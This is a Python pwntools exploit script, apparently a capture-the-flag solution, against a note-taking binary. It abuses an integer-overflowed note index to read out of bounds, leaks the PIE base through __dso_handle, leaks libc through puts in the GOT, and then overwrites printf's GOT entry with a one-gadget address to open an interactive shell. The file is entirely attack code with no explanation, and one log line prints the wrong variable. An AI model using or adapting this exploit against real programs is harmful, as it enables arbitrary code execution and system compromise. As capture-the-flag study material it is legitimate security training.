from pwn import *
from datetime import datetime, timezone

exe = ELF("./app_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = 'debug'

def conn():
    if args.REMOTE:
        r = remote("addr", 1337)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    return r

p = conn()

def parse_dt(date_str):
    timestamp = int(datetime.strptime(date_str, "%d/%m/%Y %I:%M:%S %p").replace(tzinfo=timezone.utc).timestamp())
    return timestamp & 0xffffffff


notes_offset = 0x4040a0
def idx_offset_calc(addr):
    if addr % 8 != 0:
        raise Exception
    return 18446744073709551616 - (exe.symbols["noteptrs"]-addr)//8 #18446744073709551616 results in 0th index due to overflow

def create(c):
    p.sendlineafter(b"> ", b"0", timeout=1)
    p.sendlineafter(b"> ", c)

def view(idx):
    p.sendlineafter(b"> ", b"1", timeout=1)
    p.sendlineafter(b"> ", str(idx).encode())

def edit(idx, content):
    p.sendlineafter(b"> ", b"2", timeout=1)
    p.sendlineafter(b"> ", str(idx).encode(), timeout=1)
    p.sendlineafter(b"> ", content, timeout=1)
    
##leak PIE from dso handle
view_offset = idx_offset_calc(exe.symbols["__dso_handle"])
view(view_offset)
p.recvuntil(b"on ")
x = parse_dt(p.recvline().decode().strip())
p.recvuntil(b': "')
y = u64(p.recv(2).ljust(8, b"\x00"))
dso = (y<<32)+x
log.info(f"__dso_handle is at : {hex(dso)}")

exe.address = dso - exe.symbols["__dso_handle"]
log.info(f"puts@got is at : {hex(exe.got["puts"])}")

#leak libc from GOT
notes = exe.symbols["notes"]
create(b"AAAA"+p64(exe.got["puts"]))
view(idx_offset_calc(notes+8))
p.recvuntil(b"on ")
x = parse_dt(p.recvline().decode().strip())
p.recvuntil(b': "')
y = u64(p.recv(2).ljust(8, b"\x00"))
puts = (y<<32)+x
log.info(f"puts@libc is at : {hex(dso)}")
libc.address = puts - libc.symbols["puts"]


#modify got to onegadget
create(b"AAAA"+p64(exe.got["printf"]-4))
input(f"modify?  {p.proc.pid}")
edit(idx_offset_calc(notes+168), p64(libc.address+0xebd43)) ## one gadget   


p.interactive()
